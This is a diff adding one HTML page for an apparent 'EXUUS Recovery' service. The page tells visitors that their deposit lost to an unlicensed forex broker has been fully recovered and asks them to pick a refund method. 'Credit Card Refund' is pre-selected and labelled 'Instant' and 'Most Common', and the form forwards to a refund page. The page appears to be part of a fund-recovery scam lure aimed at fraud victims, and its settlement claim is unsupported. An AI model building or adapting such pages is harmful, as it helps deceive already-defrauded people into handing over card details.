@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Select Refund Method - EXUUS Recovery</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap');
+    * { font-family: Poppins, sans-serif; box-sizing: border-box; }
+    body { margin: 0; padding: 0; }
+    .logo {
+      position: absolute;
+      top: 1rem;
+      left: 1rem;
+      width: 170px;
+      height: 40px;
+    }
+    .container {
+      width: 35rem;
+      padding: 2.5rem 0;
+      margin: 5rem auto 1.8rem;
+      display: flex;
+      flex-direction: column;
+      border: 1px solid rgba(117,117,117,0.5);
+      border-radius: 4px;
+      position: relative;
+    }
+    .title {
+      margin: 0 4rem;
+      font-size: 16px;
+      color: #333;
+    }
+    .title strong {
+      font-weight: bold;
+    }
+    .form {
+      padding: 2rem 4rem;
+    }
+    .radio-label {
+      display: flex;
+      align-items: center;
+      margin-bottom: 1.8rem;
+      cursor: pointer;
+      user-select: none;
+      position: relative;
+    }
+    .radio-label input {
+      position: absolute;
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+    .radio-custom {
+      width: 1.25rem;
+      height: 1.25rem;
+      border: 2px solid rgba(117,117,117,0.8);
+      border-radius: 50%;
+      margin-right: 0.75rem;
+      position: relative;
+      transition: border-color 0.2s;
+    }
+    .radio-custom::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0.625rem;
+      height: 0.625rem;
+      background: #219bb2;
+      border-radius: 50%;
+      transform: translate(-50%, -50%) scale(0);
+      transition: transform 0.2s ease;
+    }
+    .radio-label input:checked + .radio-custom {
+      border-color: #219bb2;
+    }
+    .radio-label input:checked + .radio-custom::after {
+      transform: translate(-50%, -50%) scale(1);
+    }
+    .radio-text {
+      font-size: 14px;
+      color: rgba(51,51,51,0.8);
+      display: flex;
+      align-items: center;
+    }
+    .badge {
+      display: inline-block;
+      font-size: 12px;
+      margin-left: 0.5rem;
+      padding: 0.25rem 0.6rem;
+      border-radius: 12px;
+      background: #e0f7fa;
+      color: #007c91;
+      font-weight: 700;
+    }
+    .badge.highlight {
+      background: #219bb2;
+      color: #fff;
+    }
+    .button {
+      float: right;
+      width: 9.2rem;
+      height: 42px;
+      background: #219bb2;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      font-weight: 500;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .button:hover {
+      background: #43afbf;
+    }
+    @media (max-width: 575px) {
+      .container { width: 95%; margin: 5rem auto 1rem; }
+      .title { font-size: 3.5vw; margin: 0 2rem; }
+      .form { padding: 2rem; }
+      .button { width: 41% !important; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Logo top-left -->
+  <div class="logo"></div>
+
+  <div class="container">
+    <p class="title">
+      Following the successful settlement of your claim, EXUUS Recovery Services has secured a full reimbursement of your deposit from the unlicensed forex broker.<br><br>
+      <strong>Please select your preferred method to receive your funds:</strong>
+    </p>
+
+    <form class="form" onsubmit="event.preventDefault(); window.location.href = '/refund.html';">
+      <!-- Credit Card Refund first and checked -->
+      <label class="radio-label">
+        <input type="radio" name="method" value="card" checked>
+        <span class="radio-custom"></span>
+        <span class="radio-text">
+          Credit Card Refund
+          <span class="badge">Instant</span>
+          <span class="badge highlight">Most Common</span>
+        </span>
+      </label>
+
+      <!-- Managers Cheque second -->
+      <label class="radio-label">
+        <input type="radio" name="method" value="bank">
+        <span class="radio-custom"></span>
+        <span class="radio-text">
+          Managers Cheque
+          <span class="badge">15–20 Business Days</span>
+        </span>
+      </label>
+
+      <button type="submit" class="button">Continue</button>
+    </form>
+  </div>
+</body>
+</html>
